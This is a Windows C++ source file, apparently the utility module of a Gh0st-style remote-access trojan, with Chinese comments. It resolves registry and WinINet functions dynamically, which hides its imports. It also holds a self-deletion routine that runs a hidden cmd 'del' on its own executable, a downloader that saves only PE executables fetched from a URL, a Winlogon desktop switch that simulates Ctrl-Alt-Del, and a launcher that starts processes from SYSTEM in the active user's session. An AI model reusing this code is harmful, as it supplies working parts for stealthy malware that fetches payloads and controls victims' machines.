#define _WIN32_WINNT 0x0501
#if !defined(AFX_UNTIL_CPP_INCLUDED)
#define AFX_UNTIL_CPP_INCLUDED
#include <windows.h>
#include <process.h>
#include <Tlhelp32.h>
#include <Wtsapi32.h>
#include <wininet.h>
#include  <io.h>
#include <stdio.h>
#include <Shlobj.h>
#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Advapi32.lib")

int my_stricmp(const char *dst, const char *src)
{
	int ch1, ch2;
	do 
	{
		if ( ((ch1 = (unsigned char)(*(dst++))) >= 'A') &&(ch1 <= 'Z') )
			ch1 += 0x20;
		if ( ((ch2 = (unsigned char)(*(src++))) >= 'A') &&(ch2 <= 'Z') )
			ch2 += 0x20;
	} while ( ch1 && (ch1 == ch2) );
	return(ch1 - ch2);
}

#include "until.h"
unsigned int __stdcall ThreadLoader(LPVOID param)
{
	unsigned int	nRet = 0;
#ifdef _DLL
 	try
 	{
#endif	
		THREAD_ARGLIST	arg;
		memcpy(&arg, param, sizeof(arg));
		SetEvent(arg.hEventTransferArg);
		// 与卓面交互
		if (arg.bInteractive)
			SelectDesktop(NULL);

		nRet = arg.start_address(arg.arglist);
#ifdef _DLL
	}catch(...){};
#endif
	return nRet;
}

char * my_strncpy( char * dest, const char * source, int count )
{
	char *p = dest;
	while (count && (*p++ = *source++)) count--;
	while(count--)
		*p++ = '\0';
	return(dest);
} 

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
					   LPDWORD lpThreadId, bool bInteractive)
{
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARGLIST	arg;
	arg.start_address = (unsigned ( __stdcall *)( void * ))lpStartAddress;
	arg.arglist = (void *)lpParameter;
	arg.bInteractive = bInteractive;
	arg.hEventTransferArg = CreateEvent(NULL, false, false, NULL);
	hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned *)lpThreadId);
	SetThreadPriority(hThread,THREAD_PRIORITY_HIGHEST);
	WaitForSingleObject(arg.hEventTransferArg, INFINITE);
	CloseHandle(arg.hEventTransferArg);
	
	return hThread;
}

char *  my_strncat(char *dest,const char *source,int count)
{
	char *p = dest;
	while (*p) p++;
	while (count-- && (*p++ = *source++));
	*p = (char)'/0';
	return(dest);
}

//读取注册表的指定键的数据(Mode:0-读键值数据 1-牧举子键)
int  ReadRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char *szData,LPBYTE szBytes,DWORD lbSize,int Mode)
{   
	HKEY   hKey;  
	int    ValueDWORD,iResult=0;
	char*  PointStr;  
	char   KeyName[32],ValueSz[MAX_PATH],ValueTemp[MAX_PATH];	
	DWORD  szSize,dwIndex=0;	 

	memset(KeyName,0,sizeof(KeyName));
	memset(ValueSz,0,sizeof(ValueSz));
	memset(ValueTemp,0,sizeof(ValueTemp));

//////////////////////////////////////////////////////////////////////////
	HINSTANCE advapi32 = LoadLibrary("ADVAPI32.dll");

	typedef BOOL (WINAPI *TRegQueryValueExA)(HKEY ,LPCTSTR ,LPDWORD ,LPDWORD ,LPBYTE ,LPDWORD );
	typedef int (WINAPI *TRegOpenKeyExA)(HKEY ,LPCTSTR ,DWORD ,REGSAM ,PHKEY );
	typedef BOOL (WINAPI *TRegEnumValueA)(HKEY ,DWORD ,LPTSTR ,LPDWORD ,LPDWORD ,LPDWORD ,LPBYTE ,LPDWORD ); 
	typedef BOOL (WINAPI *TRegEnumKeyExA)(HKEY ,DWORD ,LPTSTR ,LPDWORD ,LPDWORD ,LPTSTR ,LPDWORD ,PFILETIME ); 
	typedef BOOL (WINAPI *TRegCloseKey)(HKEY ); 



	TRegQueryValueExA MyRegQueryValueEx = (TRegQueryValueExA)GetProcAddress(advapi32, "RegQueryValueExA");
	TRegOpenKeyExA MyRegOpenKeyEx = (TRegOpenKeyExA)GetProcAddress(advapi32, "RegOpenKeyExA");
	TRegEnumValueA MyRegEnumValue= (TRegEnumValueA)GetProcAddress(advapi32, "RegEnumValueA");
	TRegEnumKeyExA MyRegEnumKeyEx= (TRegEnumKeyExA)GetProcAddress(advapi32, "RegEnumKeyExA");
	TRegCloseKey MyRegCloseKey= (TRegCloseKey)GetProcAddress(advapi32, "RegCloseKey");
//////////////////////////////////////////////////////////////////////////

		 
	__try
	{	    	
		if(MyRegOpenKeyEx(MainKey,SubKey,0,KEY_READ,&hKey) != ERROR_SUCCESS)
		{
            iResult = -1;
			__leave;
		}	
		switch(Mode)		 
		{
		case 0:
			switch(Type)
			{
			case REG_SZ:
			case REG_EXPAND_SZ:				 
				szSize = sizeof(ValueSz);
				if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)ValueSz,&szSize) == ERROR_SUCCESS)
				{
					lstrcpy(szData,ValueSz);
					iResult =1;
				}
				break;
			case REG_MULTI_SZ:	
				szSize = sizeof(ValueSz);
				if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)ValueSz,&szSize) == ERROR_SUCCESS)
				{
					for(PointStr = ValueSz; *PointStr; PointStr = strchr(PointStr,0)+1)//strchr
					{
						my_strncat(ValueTemp,PointStr,sizeof(ValueTemp));
					    my_strncat(ValueTemp," ",sizeof(ValueTemp));
					}
					lstrcpy(szData,ValueTemp);
					iResult =1;
				}
				break;				 			
			case REG_DWORD:
				szSize = sizeof(DWORD);

				if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,(LPBYTE)&ValueDWORD,&szSize ) == ERROR_SUCCESS)						
				{
				wsprintf(szData,"%d",ValueDWORD);
					iResult =1;
				}
				break;
            case REG_BINARY:
                szSize = lbSize;
				
				if(MyRegQueryValueEx(hKey,Vname,NULL,&Type,szBytes,&szSize) == ERROR_SUCCESS)
				{
					wsprintf(szData,"%08X",Type);
					iResult =1;
				}
				break;
			}
			break;
		default:
			break;
		}
	}
	__finally
	{

        MyRegCloseKey(MainKey);
		MyRegCloseKey(hKey);
	}
	if(advapi32)
		FreeLibrary(advapi32);
     
	return iResult;
}

//写注册表的指定键的数据(Mode:0-新建键数据 1-设置键数据 2-删除指定键 3-删除指定键项)
int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char* szData,DWORD dwData,int Mode)
{
	HKEY  hKey; 
	DWORD dwDisposition;    
	int   iResult =0;
//////////////////////////////////////////////////////////////////////////
	HINSTANCE advapi32 = LoadLibrary("ADVAPI32.dll");

	typedef LONG (WINAPI *TRegCreateKeyExA)(HKEY ,LPCSTR ,DWORD ,LPSTR ,DWORD ,REGSAM ,LPSECURITY_ATTRIBUTES ,PHKEY ,LPDWORD ); 
	typedef LONG (WINAPI *TRegSetValueExA)(HKEY ,LPCSTR ,DWORD ,DWORD ,CONST BYTE *,DWORD ); 
	typedef LONG (WINAPI *TRegDeleteKeyA)(HKEY ,LPCSTR ); 
	typedef LONG (WINAPI *TRegDeleteValueA)(HKEY ,LPCSTR ); 
	typedef LONG (WINAPI *TRegOpenKeyExA)(HKEY ,LPCSTR ,DWORD ,REGSAM ,PHKEY ); 
	typedef LONG (WINAPI *TRegCloseKey)(HKEY ); 

	TRegCreateKeyExA MyRegCreateKeyEx= (TRegCreateKeyExA)GetProcAddress(advapi32, "RegCreateKeyExA");
	TRegSetValueExA MyRegSetValueEx = (TRegSetValueExA)GetProcAddress(advapi32, "RegSetValueExA");
	TRegDeleteKeyA MyRegDeleteKey = (TRegDeleteKeyA)GetProcAddress(advapi32, "RegDeleteKeyA");
	TRegDeleteValueA MyRegDeleteValue= (TRegDeleteValueA)GetProcAddress(advapi32, "RegDeleteValueA");
	TRegOpenKeyExA MyRegOpenKeyEx = (TRegOpenKeyExA)GetProcAddress(advapi32, "RegOpenKeyExA");
	TRegCloseKey MyRegCloseKey= (TRegCloseKey)GetProcAddress(advapi32, "RegCloseKey"); 
//////////////////////////////////////////////////////////////////////////

	
	__try
	{	
	//	SetKeySecurityEx(MainKey,Subkey,KEY_ALL_ACCESS);
		switch(Mode)		
		{			
		case 0:
			if(MyRegCreateKeyEx(MainKey,SubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,&dwDisposition) != ERROR_SUCCESS)
				__leave;		 
		case 1:	
			if(MyRegOpenKeyEx(MainKey,SubKey,0,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)	
				__leave;		 		 			 
			switch(Type)
			{		 
			case REG_SZ:		 
			case REG_EXPAND_SZ:	
			case REG_MULTI_SZ:
			if(MyRegSetValueEx(hKey,Vname,0,Type,(LPBYTE)szData,lstrlen(szData)+1) == ERROR_SUCCESS)
					iResult =1;				 			
				break;
		    case REG_DWORD:
                if(MyRegSetValueEx(hKey,Vname,0,Type,(LPBYTE)&dwData,sizeof(DWORD)) == ERROR_SUCCESS)  
		            iResult =1;				 			 
			    break;
		    case REG_BINARY:
			    break;
			}
			break;				
		case 2:
            if(MyRegOpenKeyEx(MainKey,SubKey,NULL,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)				
				__leave;                
			if (MyRegDeleteKey(hKey,Vname) == ERROR_SUCCESS)		        
				iResult =1;
			break;		
		case 3:
            if(MyRegOpenKeyEx(MainKey,SubKey,NULL,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)	
				__leave;                
			if (MyRegDeleteValue(hKey,Vname) == ERROR_SUCCESS)	
				iResult =1;
			break;
		default:
			__leave;                

		}
	}
	__finally 
	{
	   MyRegCloseKey(MainKey);		
	   MyRegCloseKey(hKey);
	}
	if(advapi32)
		FreeLibrary(advapi32);
	return iResult;
}
//*************************************************************
void MyCreatDirector(LPSTR Path)   //创建文件夹
{
	
	CHAR Dir[MAX_PATH]={NULL};
	int i;
	
	for (i=0; (size_t)i < strlen(Path); i++)
	{
		if(Path[i]=='\\')
		{
			strncpy(Dir,Path,i);
			if(_access(Dir,NULL)==-1)
			{
				CreateDirectory(Dir,NULL);
			}
		}
	}

}
int StormRand(int count)
{	
	unsigned long Time=GetTickCount();	
	unsigned long seed=rand()+3;	
	seed=(seed*Time)%count;	
	return (int)seed;
}

void DeleteMe()
{
	char szModule [MAX_PATH],
		szComspec[MAX_PATH],
		szParams [MAX_PATH];
	// 得到文件路径:
	if((GetModuleFileName(0,szModule,MAX_PATH)!=0) &&
		(GetShortPathName(szModule,szModule,MAX_PATH)!=0) &&
		(GetEnvironmentVariable("COMSPEC",szComspec,MAX_PATH)!=0))
	{
		// 设置命令参数
		wsprintf(szParams," /c del %s > nul",szModule);
		lstrcat(szComspec,szParams);
		
		// 设置结构体成员
		STARTUPINFO  si={0};
		PROCESS_INFORMATION pi={0};
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
		// 为程序分配资源
		::SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
		::SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
		
		// 调用命令
		if(CreateProcess(0, szComspec, 0, 0, 0,CREATE_SUSPENDED | DETACHED_PROCESS, 0, 0, &si, &pi))
		{
			// 暂停命令直到程序退出
			::SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
			::SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE);
			// 恢复命令并设置低优先权
			::ResumeThread(pi.hThread);
			ExitProcess(0);
			return;
		}
		else // 如果出错，格式化分配的空间
		{
			::SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
			::SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
		}
	}
}

bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
{
	HINTERNET	hInternet = NULL, hUrl = NULL;
	HANDLE		hFile;
	TCHAR		buffer[1024];
	DWORD		dwBytesRead = 0;
	DWORD		dwBytesWritten = 0;
	BOOL		bIsFirstPacket = true;
	bool		bRet = true;
	
	HINSTANCE hdlldes = LoadLibrary("wininet.dll"); 
	
	typedef HINTERNET (WINAPI *NETOPEN)(LPCTSTR ,DWORD, LPCTSTR, LPCTSTR ,DWORD) ; 
	NETOPEN myNetOpen= (NETOPEN)GetProcAddress(hdlldes, "InternetOpenA");
	
	hInternet = myNetOpen("MSIE 6.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL,INTERNET_INVALID_PORT_NUMBER,0);
	
	
	if (hInternet == NULL)
	{
		if(hdlldes)
			FreeLibrary(hdlldes);
		return false;
	}
	
	typedef HINTERNET (WINAPI *NETOPENURL)(HINTERNET ,LPCTSTR ,LPCTSTR ,DWORD ,DWORD ,DWORD_PTR ); 
	NETOPENURL 	myNetOpenUrl= (NETOPENURL)GetProcAddress(hdlldes, "InternetOpenUrlA");
	
	hUrl = myNetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	
	if (hUrl == NULL)
	{
		if(hdlldes)
			FreeLibrary(hdlldes);
		return false;
	}
	hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			memset(buffer, 0, sizeof(buffer));
			typedef BOOL (WINAPI *APIS)(HINTERNET ,LPVOID ,DWORD ,LPDWORD ); 
			APIS myapis; 
			myapis= (APIS)GetProcAddress(hdlldes, "InternetReadFile"); 
			myapis(hUrl, buffer, sizeof(buffer), &dwBytesRead);
			
			// 由判断第一个数据包是不是有效的PE文件
			if (bIsFirstPacket && ((PIMAGE_DOS_HEADER)buffer)->e_magic != IMAGE_DOS_SIGNATURE)
			{
				bRet = false;
				break;
			}
			bIsFirstPacket = false;
			
			WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
		} while(dwBytesRead > 0);
		CloseHandle(hFile);
	}
	
	
	Sleep(1);
	typedef BOOL (WINAPI *NETCLOSE)(HINTERNET hInternet); 
	NETCLOSE  myNetClose= (NETCLOSE  )GetProcAddress(hdlldes,"InternetCloseHandle"); 
	
	myNetClose(hUrl);
	myNetClose(hInternet);
	
	if(hdlldes)
		FreeLibrary(hdlldes);
	
	return bRet;
}
FARPROC MyGetProcAddressA(LPCSTR lpFileName, LPCSTR lpProcName)
{
	HMODULE hModule;
	hModule = GetModuleHandleA(lpFileName);
	if (hModule == NULL)
		hModule = LoadLibraryA(lpFileName);
	if (hModule != NULL)
		return GetProcAddress(hModule,lpProcName);
	else
		return NULL;
}
#define UNLEN       256                 // Maximum user name length
bool OpenFile1(LPCTSTR lpFile, BOOL bRunInAcsiUser, INT nShowCmd)
{
	LPSTR		lpszUserSid = NULL;
	
	char	lpSubKey[512];
	HKEY	hKey;
	char	strTemp[1024];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	DWORD dwFileAttr = GetFileAttributesA(lpFile);
	if (dwFileAttr == INVALID_FILE_ATTRIBUTES)
		return false;
	if (dwFileAttr & FILE_ATTRIBUTE_DIRECTORY)
		return ShellExecuteA(NULL, "open", lpFile, NULL, NULL, SW_SHOW) > (HINSTANCE)32;
	
	char	*lpExt = strrchr(lpFile, '.');
	if (lpExt == NULL)
		return false;
	
	char	szCurrentDirectory[MAX_PATH];
	memset(szCurrentDirectory, 0, sizeof(szCurrentDirectory));
	strncpy(szCurrentDirectory, lpFile, strrchr(lpFile, '\\') - lpFile);
	
	char szUserName[UNLEN+1];
	DWORD dwUserLen = UNLEN;
	GetUserName(szUserName, &dwUserLen);
	if (stricmp(szUserName, "SYSTEM") == 0)
	{
		while (lpszUserSid == NULL)
			Sleep(100);
	}
	
	if (lpszUserSid != NULL)
	{
		memset(lpSubKey, 0, sizeof(lpSubKey));
		sprintf(lpSubKey, "%s_Classes\\%s", lpszUserSid, lpExt);
		if (RegOpenKeyExA(HKEY_USERS, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
		{
			if (RegOpenKeyExA(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
				return false;
		}
	}
	else if (RegOpenKeyExA(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
	{
		return false;
	}
	RegQueryValueA(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	
	if (lpszUserSid != NULL)
	{
		memset(lpSubKey, 0, sizeof(lpSubKey));
		sprintf(lpSubKey, "%s_Classes\\%s\\shell\\open\\command", lpszUserSid, strTemp);
		if (RegOpenKeyExA(HKEY_USERS, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
		{
			memset(lpSubKey, 0, sizeof(lpSubKey));
			sprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
			if (RegOpenKeyExA(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
				return false;
		}
	}
	else
	{
		memset(lpSubKey, 0, sizeof(lpSubKey));
		sprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
		if (RegOpenKeyExA(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
			return false;
	}
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValueA(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = nShowCmd;
	BOOL	bFileExtMatch = stricmp(lpExt, ".exe") && stricmp(lpExt, ".bat") && stricmp(lpExt, ".com");
	DWORD	dwSessionId = 0;
	HANDLE	hTokenAcsi = NULL;
	
	if (stricmp(szUserName, "SYSTEM") == 0 && (bRunInAcsiUser ? TRUE : bFileExtMatch))
	{
		dwSessionId = WTSGetActiveConsoleSessionId();
		if (dwSessionId == 0xFFFFFFFF)
			return false;
		if (!WTSQueryUserToken(dwSessionId, &hTokenAcsi))
			return false;
	}
	
	if (hTokenAcsi == NULL) // 可执行文件(.exe .bat .com), 以SYSTEM权限运行
	{
		if (!CreateProcessA(NULL, strTemp, NULL, NULL, FALSE, 0, NULL, szCurrentDirectory, &si, &pi))
			return false;
	}
	else if (!CreateProcessAsUserA(hTokenAcsi, NULL, strTemp, NULL, NULL, FALSE, 0, NULL, szCurrentDirectory, &si, &pi))
	{
		CloseHandle(hTokenAcsi);
		return false;
	}
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	if (hTokenAcsi)
		CloseHandle(hTokenAcsi);
	return true;
}

BOOL SelectHDESK(HDESK new_desktop)
{
	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());
	
	DWORD dummy;
	char new_name[256];
	
	if (!GetUserObjectInformationA(new_desktop, UOI_NAME, &new_name, 256, &dummy)) {
		return FALSE;
	}
	
	// Switch the desktop
	if(!SetThreadDesktop(new_desktop)) {
		return FALSE;
	}
	
	// Switched successfully - destroy the old desktop
	CloseDesktop(old_desktop);
	
	return TRUE;
}

// - SelectDesktop(char *)
// Switches the current thread into a different desktop, by name
// Calling with a valid desktop name will place the thread in that desktop.
// Calling with a NULL name will place the thread in the current input desktop.

BOOL SelectDesktop(char *name)
{
	HDESK desktop;
	
	if (name != NULL)
	{
	
		desktop = OpenDesktopA(name, 0, FALSE, 0x1FF);
	}
	else
	{
		desktop = OpenInputDesktop(1, FALSE, 0x1FF);
	}
	
	if (desktop == NULL)
	{
		return FALSE;
	}
	
	// Switch to the new desktop
	if (!SelectHDESK(desktop))
	{
		// Failed to enter the new desktop, so free it!
		CloseDesktop(desktop);
		return FALSE;
	}
	
	// We successfully switched desktops!
	return TRUE;
}

BOOL SimulateCtrlAltDel()
{
	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());
	
	// Switch into the Winlogon desktop
	if (!SelectDesktop("Winlogon"))
	{
		return FALSE;
	}
	
	// Fake a hotkey event to any windows we find there.... :(
	// Winlogon uses hotkeys to trap Ctrl-Alt-Del...
	PostMessage(HWND_BROADCAST, WM_HOTKEY, 0, MAKELONG(MOD_ALT | MOD_CONTROL, VK_DELETE));
	
	// Switch back to our original desktop
	if (old_desktop != NULL)
		SelectHDESK(old_desktop);
	
	return TRUE;
}
bool SwitchInputDesktop()
{
	BOOL	bRet = false;
	DWORD	dwLengthNeeded;
	
	HDESK	hOldDesktop, hNewDesktop;
	char	szOldDesktop[256], szNewDesktop[256];
	
	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(szOldDesktop, 0, sizeof(szOldDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME, &szOldDesktop, sizeof(szOldDesktop), &dwLengthNeeded);
	
	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(szNewDesktop, 0, sizeof(szNewDesktop));
	GetUserObjectInformation(hNewDesktop, UOI_NAME, &szNewDesktop, sizeof(szNewDesktop), &dwLengthNeeded);
	
	if (lstrcmpi(szOldDesktop, szNewDesktop) != 0)
	{
		SetThreadDesktop(hNewDesktop);
		bRet = true;
	}
	
	CloseDesktop(hOldDesktop);
	CloseDesktop(hNewDesktop);
	return bRet;
}

DWORD GetProcessID(LPCTSTR lpProcessName)
{
	DWORD RetProcessID = 0;
	HANDLE handle=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32* info=new PROCESSENTRY32;
	info->dwSize=sizeof(PROCESSENTRY32);
	
	if(Process32First(handle,info))
	{
		if (my_stricmp(info->szExeFile,lpProcessName) == 0)
		{
			RetProcessID = info->th32ProcessID;
			delete info;
			return RetProcessID;
		}
		while(Process32Next(handle,info) != FALSE)
		{
			if (lstrcmpi(info->szExeFile,lpProcessName) == 0)
			{
				RetProcessID = info->th32ProcessID;
				delete info;
				return RetProcessID;
			}
		}
	}
	
	CloseHandle(handle);//新修改
	delete info;
	return RetProcessID;
}

#endif // !defined(AFX_UNTIL_CPP_INCLUDED)